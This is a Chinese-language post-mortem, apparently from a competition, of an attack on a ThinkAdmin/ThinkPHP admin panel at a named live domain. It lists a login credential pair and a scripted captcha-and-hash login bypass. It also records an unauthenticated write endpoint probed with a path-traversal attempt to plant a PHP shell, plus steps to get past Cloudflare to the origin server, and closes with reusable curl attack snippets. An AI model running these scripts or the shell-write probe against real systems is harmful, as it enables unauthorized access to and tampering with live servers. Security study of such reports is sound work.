# 0821 wadsax 比赛复盘 · ThinkAdmin二开陷阱（精简可复用）

> 目标：https://wadsaxzasd.fghdfghsadf.live/admin/  ThinkPHP V6.1.4 + ThinkAdmin 2.0 + Cloudflare + Nginx
> 账号：10003 / CxNbRNEjswjeWhv  结果：⚠️ 未拿shell/整站源码，命中 public.zip 钓鱼包与 /app/addContent 未授权写

## 1. 登录二开识别（30秒内）
- 原版 ThinkAdmin 只需 verify+uniqid，本场多 `code(临时令牌)` + `power(local_zhiwen指纹)`。
- 登录页：`document.getElementById("power").value = localStorage.getItem("local_zhiwen")`；`power` 实际为 FingerprintJS visitorId，非固定。
- 验证码：`POST /admin/login/captcha` type=LoginCaptcha&token=xxx → {uniqid, code, image}，一次性；登录 `POST /admin/login/index` 需带 verify+uniqid+code+power，密码=`md5(md5(明文)+uniqid)`。
- 失败特征：空code→`临时令牌不能为空`；错code→`账号或密码错误`；错verify→`图形验证码失败`。不要盲爆code（时间/弱口令20+均无效），赛方code是动态绑定账号的。

## 2. public.zip 伪源码坑
- `/public.zip` 11M 命中但 `unzip -l` 264文件全在 `upload/**/index.html+jquery` 无一 `.php`，是钓鱼模板合集。
- 判定：命中zip后立即 `unzip -l | grep -E "\.php|\.env|database\.php|config"`，无则标⚠️非源码，继续扫。

## 3. 备份字典全404后的旁路
- 30+名 www.zip/backup.zip/.env/.git 全404 时，转 `POST /app/addContent` base_url+"/app/addContent" data={content1,content2,content3,aid,remark,type=new} 无需登录均 `{"code":1,"success"}`，是钓鱼入库口。
- 写 `../../public/shell.php` + `<?php phpinfo()` 也 success 但 `GET /public/shell.php` 404，未落地；无读口 `/app/getContent` 404，属于存储型非RCE，不要当成写shell成功。

## 4. CF 代理陷阱
- nmap -F 只开 80/443/8080/8443；nmap 1-65535 开 13口 80/443/2052/2053/2082/2083/2086/2087/2095/2096/8080/8443/8880 均为CF代理。
- `curl -H "Host: 目标" http://CF_IP/admin/login.html` 回相同标题即证CF遮挡，继续扫端口无意义，转证书透明度/favicon/历史DNS溯源。

## 5. 用户执行纪律（本场被纠正）
- 别死磕登录：验证码+code卡住→立即换路（源码泄露/未授权写/JS提取 /admin/*）。
- 别BB：每30秒同步真实数（已扫/已试/失败⚠️/下一步），不编CVE/端点。
- 大范围干：用 `ffuf common.txt + nuclei -tags exposure,thinkphp + 30名备份并行` 一次铺开，失败即停换路。

## 复用命令片段
```bash
# 验证码→登录（每次重拿）
html=$(curl -sk $T/admin/login.html); tok=$(echo $html|grep -oP 'captcha-token="\K[^"]+')
j=$(curl -sk -XPOST $T/admin/login/captcha -d "type=LoginCaptcha&token=$tok"); uid=$(echo $j|jq -r .data.uniqid); vc=$(echo $j|jq -r .data.code)
h=$(echo -n $(echo -n $PASS|md5sum|cut -d\  -f1)$uid|md5sum|cut -d\  -f1)
curl -sk -XPOST $T/admin/login/index -d "username=$U&password=$h&verify=$vc&uniqid=$uid&code=1111&power=$(echo -n $vc|md5sum|cut -d\  -f1|cut -c1-32)"

# zip真假判定
curl -skL -o /tmp/p.zip $T/public.zip && unzip -l /tmp/p.zip | head -n 120

# 未授权写探测
curl -sk -XPOST $T/app/addContent -d 'content1=test&content2=777&content3=123456&aid=1&remark=test&type=new'
```
